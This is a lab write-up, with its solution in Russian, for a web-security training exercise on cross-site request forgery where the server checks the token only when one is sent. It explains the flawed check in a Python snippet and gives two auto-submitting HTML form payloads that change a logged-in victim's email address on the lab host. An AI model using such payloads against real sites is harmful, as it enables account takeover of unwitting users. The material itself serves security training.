# Lab: CSRF where token validation depends on token being present

Level: `PRACTITIONER`

## Description

This lab's email change functionality is vulnerable to `CSRF`.

> To solve the lab, use your exploit server to host an HTML page that uses a `CSRF` attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

# Solution

Здесь логика решения такова. 
Иногда для валидации код по какой-то причине пропускает запросы без `csrf`:

```python
if "csrf" in request.params:
    if request.params["csrf"] != expected_token:
        deny()
process_request()
```

Для такого случая подойдет такой payload:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a47009d03f2063b802c0315003700db.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test4&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Либо такой:
```html
<form action="https://0a47009d03f2063b802c0315003700db.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="hacker2@evil-user.net">
  <input type="submit" value="Submit request">
</form>
<script>document.forms[0].submit();</script>
```
